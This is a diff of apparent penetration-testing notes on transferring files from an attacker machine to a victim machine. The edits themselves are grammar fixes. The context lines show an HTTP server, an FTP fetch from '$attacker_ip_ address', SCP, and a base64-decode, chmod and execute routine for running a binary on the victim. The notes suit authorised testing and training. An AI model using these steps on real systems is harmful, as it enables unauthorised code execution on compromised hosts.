@@ -9,7 +9,7 @@ Set up an HTTP server on your attacker machine and download the files from the v
 - `port=8888; python3 -m http.server      $port`
 - `port=8888; python  -m SimpleHTTPServer $port`
 
-From the victim machine you can use any browser to navigate to the IP address and download the files or the following commands:
+From the victim machine you can use any browser you want to navigate to the IP address and download the files or you can use the following commands:
 
 ### CMD
 
@@ -27,7 +27,7 @@ From the victim machine you can use any browser to navigate to the IP address an
 
 ### SSH
 
-If you have an SSH session you can use SCP command to download files. To download/upload directories use the -r (recursive) switch
+If you have an SSH session open, then you can use the SCP command to download files. To download/upload directories use the -r (recursive) switch
 
 Downloading files from the host:
 
@@ -48,7 +48,7 @@ ftp to the attacker machine and use the GET command to download files.
 
 - `ftp $attacker_ip_ address`
 
-To upload files use the `-w` switch to enable anonymous write.
+To upload files use the `-w` switch to enable anonymous write and the PUT command.
 
 ### TFTP
 
@@ -121,7 +121,7 @@ So we encoded the binary, copy-pasted the base64 string into a text file using e
 then decrypted it with the base64 utility using the -d switch (decrypt) to a single file. \
 We made it executable with the chmod +x command than executed it.
 
-It works well on smaller scripts, copy pasting the string of a complex program could crash a shell.
+It works well on smaller scripts, but copy pasting the string of a complex program could crash the shell.
 
 
 
